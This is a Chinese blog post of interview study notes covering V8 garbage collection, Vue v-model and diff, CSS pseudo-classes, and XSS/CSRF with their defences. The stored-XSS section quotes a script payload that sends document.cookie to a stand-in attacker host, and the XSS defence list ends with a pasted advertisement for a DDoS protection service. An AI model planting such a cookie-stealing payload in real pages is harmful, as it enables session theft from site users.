title: 一些面试的总结
author: coolsong
tags:
  - JavaScript
categories:
  - JS
date: 2020-06-28 19:55:00
---
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近又参加了许多的面试，这里简单总结一下面试中遇到的自己还不是太清楚的问题。主要是一些自己之前没了解过的知识点。
<!--more-->
### V8垃圾回收
>v8是Google推出的JS引擎，他不仅提升了Chrome的性能，也为node提供了很好的支持。其垃圾回收机制主要采用的是内存分代。

#### V8的内存分代
> 在v8中将内存分为了新生代和老生代，他们的主要特点如下：

* 老生代：对象存活时间较长。经历过一次或多次垃圾回收的对象。
* 新生代：对象的存活时间较短。新生对象或只经过一次垃圾回收的对象。

>V8堆的空间等于新生代空间加上老生代空间。我们可以通过 --max-old-space-size命令设置老生代空间的最大值，--max-new-space-size 命令设置新生代空间的最大值。老生代与新生代的空间大小在程序初始化时设置，一旦生效则不能动态改变。

#### 回收算法

* 新生代算法： 主要采用Scavenge算法

>先在新生代区，将堆内存对半分，一半处于使用(即From区)，另一半处于闲置(即To区)，平时在From区进行操作。到了要回收的时候，检测From区的对象，存活的对象复制到To   区，然后From区被释放了，之后对To区和From区调换名字，继续重复之前操作

* 对象晋升： 新生代 -> 老生代

>对象是否经历过Scavenge回收。对象从 From 空间复制 To 空间时，会检查对象的内存地址来判断对象是否已经经过一次Scavenge回收。若经历过，则将对象从 From 空间复制到老生代中；若没有经历，则复制到 To 空间。

>To 空间的内存使用占比是否超过限制。当对象从From 空间复制到 To 空间时，若 To 空间使用超过 25%，则对象直接晋升到老生代中。设置为25%的比例的原因是，当完成 Scavenge 回收后，To 空间将翻转成From 空间，继续进行对象内存的分配。若占比过大，将影响后续内存分配。

* 老生代算法： 标记清除 搭配 标记整理算法

>标记清除算法：先将存活的对象进行标记，清除时只清除没有标记的（老生代中都是生命周期长的对象，刚好死亡的对象少），不过此时会出现内存不连续的情况。但是，如果此时需要放一个大对象，则放不下，从而导致再次引起回收。然而这次回收是不必要的。

>标记整理算法：先将死亡的对象进行标记，然后将存活得对象往一段移动，移动完成后，清理掉边界外的内存。

### v-model

>我们应该都知道v-model是用来在一些表单控件（input、select、textarea）上创建双向数据绑定。其本质上也是语法糖，不同的控件对应着不同的属性和事件。但是在自定义组件上又起着怎样的作用呢？

```vue
<base-checkbox v-model="value"></base-checkbox>
```

>一个组件上的 v-model 默认会利用名为 value 的 prop 和名为 input 的事件，但是像单选框、复选框等类型的输入控件可能会将 value attribute 用于不同的目的。这样的话主要是使用model选项来控制

```JavaScript
Vue.component('base-checkbox', {
  model: {
    prop: 'checked',
    event: 'change'
  },
  props: {
    checked: Boolean
  },
  template: `
    <input
      type="checkbox"
      v-bind:checked="checked"
      v-on:change="$emit('change', $event.target.checked)"
    >
  `
})


<base-checkbox v-model="message"></base-checkbox>
```
>这里的 message 的值将会传入这个名为 checked 的 prop。同时当 <base-checkbox> 触发一个 change 事件并附带一个新的值的时候，这个 message 的 property 将会被更新

### Vue DIFF 算法
>简单的来说，vue的diff算法会有以下的过程：
* 同级比较，再比较子节点
* 先判断一方有子节点一方没有子节点的情况（如果新的children没有子节点，将旧的子节点移除）
* 比较都有子节点的情况（核心diff）
* 递归比较子节点

> Vue2的核心diff算法采用了双端比较的算法，同时从新旧children的两端开始进行比较，借助key值找到可复用的节点，在进行相关操作。

> Vue3借鉴了[ivi](https://github.com/localvoid/ivi)算法和[inferno](https://github.com/infernojs/inferno)算法
> 在创建VNode时就确定其类型，以及在patch的过程中采用位运算来判断其类型。
> 更加详细的介绍可以参考[深入剖析：Vue核心之虚拟DOM](https://juejin.im/post/5d36cc575188257aea108a74)

### 伪类和伪元素
> 大家应该都听过这两个名词，但是这两个却很容易混淆，我们要牢记这些概念需要从它们的产生开始了解。

>css引入伪类和伪元素概念是为了格式化文档树以外的信息。也就是说，伪类和伪元素是用来修饰不在文档树中的部分，比如，一句话中的第一个字母，或者是列表中的第一个元素。下面分别对伪类和伪元素进行解释。

>伪类用于当已有元素处于的某个状态时，为其添加对应的样式，这个状态是根据用户行为而动态变化的。比如说，当用户悬停在指定的元素时，我们可以通过:hover来描述这个元素的状态。虽然它和普通的css类相似，可以为已有的元素添加样式，但是它只有处于dom树无法描述的状态下才能为元素添加样式，所以将其称为伪类。

>伪元素用于创建一些不在文档树中的元素，并为其添加样式。比如说，我们可以通过:before来在一个元素前增加一些文本，并为这些文本添加样式。虽然用户可以看到这些文本，但是这些文本实际上不在文档树中。

* 具体标签
![Image](/images/class1.png)
![Image](/images/class2.png)

### 前端安全相关
>大家应该都知道一些这方面的知识，比如XSS、CSRF等，但是当别人问的更加详细时（如何实现相应的攻击等），就有可能回答不上来了。

#### XSS
>XSS(Cross Site Script)跨站脚本攻击。指的是攻击者向网页注入恶意的客户端代码，通过恶意的脚本对客户端网页进行篡改，从而在用户浏览网页时，对用户浏览器进行控制或者获取用户隐私数据的一种攻击方式。主要分为3种：

##### 反射型
>反射性XSS的原理是：反射性xss一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的URL。当受害者点击恶意链接url的时候，恶意代码会直接在受害者的主机上的浏览器执行。

>反射性XSS又可以叫做非持久性XSS。为什么叫反射型XSS呢？那是因为这种攻击方式的注入代码是从目标服务器通过错误信息，搜索结果等方式反射回来的，而为什么又叫非持久性XSS呢？那是因为这种攻击方式只有一次性。

>比如：攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接的时候，注入脚本被传输到目标服务器上，然后服务器将注入脚本 "反射"到受害者的浏览器上，从而浏览器就执行了该脚本。

* 攻击步骤

1. 攻击者在url后面的参数中加入恶意攻击代码。
2. 当用户打开带有恶意代码的URL的时候，网站服务端将恶意代码从URL中取出，拼接在html中并且返回给浏览器端。
3. 用户浏览器接收到响应后执行解析，其中的恶意代码也会被执行到。
4. 攻击者通过恶意代码来窃取到用户数据并发送到攻击者的网站。攻击者会获取到比如cookie等信息，然后使用该信息来冒充合法用户的行为，调用目标网站接口执行攻击等操作。

##### 存储型
>存储型XSS的原理是：主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。

>比如我现在做了一个博客网站，然后攻击者在上面发布了一篇文章，内容是如下：<script>window.open("www.gongji.com?param="+document.cookie)</script> 如果我没有对该文章进行任何处理的话，直接存入到数据库中，那么下一次当其他用户访问该文章的时候，服务器会从数据库中读取后然后响应给客户端，那么浏览器就会执行这段脚本，然后攻击者就会获取到用户的cookie，然后会把cookie发送到攻击者的服务器上了。

* 攻击步骤

1. 攻击者将恶意代码提交到目标网站数据库中。
2. 用户打开目标网站时，网站服务器将恶意代码从数据库中取出，然后拼接到html中返回给浏览器中。
3. 用户浏览器接收到响应后解析执行，那么其中的恶意代码也会被执行。
4. 那么恶意代码执行后，就能获取到用户数据，比如上面的cookie等信息，那么把该cookie发送到攻击者网站中，那么攻击者拿到该cookie然后会冒充该用户的行为，调用目标网站接口等违法操作。

##### DOM型
>我们客户端的js可以对页面dom节点进行动态的操作，比如插入、修改页面的内容。比如说客户端从URL中提取数据并且在本地执行、如果用户在客户端输入的数据包含了恶意的js脚本的话，但是这些脚本又没有做任何过滤处理的话，那么我们的应用程序就有可能受到DOM-based XSS的攻击。

* 攻击步骤

1. 使用document.write直接输出数据。
2. 使用innerHTML直接输出数据。
3. 使用location、location.href、location.replace、iframe.src、document.referer、window.name等这些。

##### 防御
1. 对输入内容的特定字符进行编码，例如表示 html标记的 < > 等符号。 
2. 对重要的 cookie设置 httpOnly, 防止客户端通过document.cookie读取 cookie，此 HTTP头由服务端设置。 
3. 将不可信的值输出 URL参数之前，进行 URLEncode操作，而对于从 URL参数中获取值一定要进行格式检测（比如你需要的时URL，就判读是否满足URL格式）。 
4. 不要使用 Eval来解析并运行不确定的数据或代码，对于 JSON解析请使用 JSON.parse() 方法。 5. 后端接口也应该要做到关键字符过滤的问题。 以上，是小墨给大家分享的关于XSS攻击的全部内容，大家记得收藏方便以后查看哦。如今，各种类型网络攻击日益频繁，除了XSS攻击之外，比较常见的网络攻击类型还包括DDoS攻击、CC攻击等，它们非常难以防御，除了需要做好日常网络安全防护之外，还需要接入高防服务，可以接入墨者盾高防，通过墨者盾高防隐藏源IP，对攻击流量进行清洗，保障企业网络及业务的正常运行。

#### CSRF
>CSRF攻击(Cross-site request forgery)跨站请求伪造。是一种劫持受信任用户向服务器发送非预期请求的攻击方式，通常情况下，它是攻击者借助受害者的 Cookie 骗取服务器的信任，但是它并不能拿到Cookie，也看不到Cookie的内容，它能做的就是给服务器发送请求，然后执行请求中所描述的命令，以此来改变服务器中的数据，也就是并不能窃取服务器中的数据。

* 攻击步骤

1. 登录受信任网站A，并在本地生成Cookie。
2. 在不登出A的情况下，访问危险网站B。

* 防御

1. 验证Token：浏览器请求服务器时，服务器返回一个token，每个请求都需要同时带上token和cookie才会被认为是合法请求
2. 验证Referer：通过验证请求头的Referer来验证来源站点，但请求头很容易伪造
3. 设置SameSite：设置cookie的SameSite，可以让cookie不随跨站请求发出，但浏览器兼容不一


